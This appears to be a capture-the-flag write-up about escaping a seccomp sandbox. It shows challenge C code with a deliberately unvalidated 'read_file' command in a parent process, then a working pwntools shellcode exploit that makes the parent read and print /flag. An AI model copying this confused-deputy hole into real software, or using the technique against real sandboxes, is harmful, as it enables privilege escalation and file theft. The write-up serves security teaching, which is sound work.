#metadata(
  (
    title: "Sandbox Bypass via Parent-Child IPC",
    description: "Bypassing a restricted sandbox by leveraging privileged commands provided by the parent process through a socketpair connection.",
    date: "2025-12-30",
    order: 13,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Sandbox Bypass via Parent-Child IPC

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int child_pid;

void cleanup(int signal)
{
    kill(child_pid, 9);
    kill(getpid(), 9);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    for (int i = 3; i < 10000; i++) close(i);

    int file_descriptors[2];
    assert(socketpair(AF_UNIX, SOCK_STREAM, 0, file_descriptors) == 0);
    int parent_socket = file_descriptors[0];
    int child_socket = file_descriptors[1];

    alarm(1);
    signal(SIGALRM, cleanup);

    child_pid = fork();
    if (!child_pid)
    {
        close(0);
        close(1);
        close(2);
        close(parent_socket);

        void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
        assert(shellcode == (void *)0x1337000);

        scmp_filter_ctx ctx;

        ctx = seccomp_init(SCMP_ACT_KILL);
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

        assert(seccomp_load(ctx) == 0);

        read(child_socket, shellcode, 0x1000);

        write(child_socket, "print_msg:Executing shellcode!", 128);

        ((void(*)())shellcode)();
    }

    else
    {
        char shellcode[0x1000];
        read(0, shellcode, 0x1000);

        write(parent_socket, shellcode, 0x1000);

        while (true)
        {
            char command[128] = { 0 };

            int command_size = read(parent_socket, command, 128);
            command[9] = '\0';

            char *command_argument = &command[10];
            int command_argument_size = command_size - 10;

            if (strcmp(command, "print_msg") == 0)
            {
                puts(command_argument);
            }
            else if (strcmp(command, "read_file") == 0)
            {
                sendfile(parent_socket, open(command_argument, 0), 0, 128);
            }
            else
            {
                break;
            }
        }
    }
}
```

== Vulnerability Analysis

The vulnerability is logical: the parent process acts as a privileged proxy for the restricted child process. The child is sandboxed (can only `read`, `write`, `exit`), but it is connected to the parent via a socket (FD 4).

The parent implements a protocol with a command `read_file` that blindly opens any path requested by the child and sends its content back.

```c
else if (strcmp(command, "read_file") == 0)
{
    sendfile(parent_socket, open(command_argument, 0), 0, 128);
}
```

Because the parent performs no validation on `command_argument`, the child can request `/flag` even though it cannot `open()` it directly.

== Exploitation Plan

1. *Request Flag:* Send the `read_file` command with the argument `/flag` to the parent via the socket (FD 4).
  - Payload: `"read_file\x00/flag\x00..."` (padded to 128 bytes).
2. *Receive Flag:* Read 128 bytes from the socket. This will be the content of the flag sent by the parent.
3. *Exfiltrate:* To see the flag, we can use the `print_msg` command. Send `print_msg` with the flag content as the argument back to the parent.
  - Payload: `"print_msg\x00" + flag_content ...`

== Exploit Script

```python
from pwn import *

context.arch = "amd64"

pc = process("./c_binary")

# Constants
CHILD_SOCKET_FD = 4
SHELLCODE_BASE = 0x1337000
BUF_ADDR = SHELLCODE_BASE + 0x900

# Refactored shellcode using shellcraft
sc = ""
# 1. Send "read_file\0/flag" (128 bytes)
sc += shellcraft.pushstr(b"read_file\x00/flag".ljust(128, b"\x00"))
sc += shellcraft.write(CHILD_SOCKET_FD, "rsp", 128)

# 2. Read flag from socket into BUF_ADDR + 10 (offset for "print_msg\0")
sc += shellcraft.read(CHILD_SOCKET_FD, BUF_ADDR + 10, 118)

# 3. Prepend "print_msg\0" to the buffer
sc += shellcraft.pushstr(b"print_msg\x00")
sc += shellcraft.mov("rdi", BUF_ADDR)
sc += shellcraft.mov("rsi", "rsp")
sc += shellcraft.mov("rcx", 10)
sc += "rep movsb\n"

# 4. Send "print_msg\0<flag>" (128 bytes) to parent
sc += shellcraft.write(CHILD_SOCKET_FD, BUF_ADDR, 128)

# 5. Exit
sc += shellcraft.exit(0)

shellcode = asm(sc)


pc.send(shellcode.ljust(0x1000, b"\0"))
print(pc.clean().decode())
```
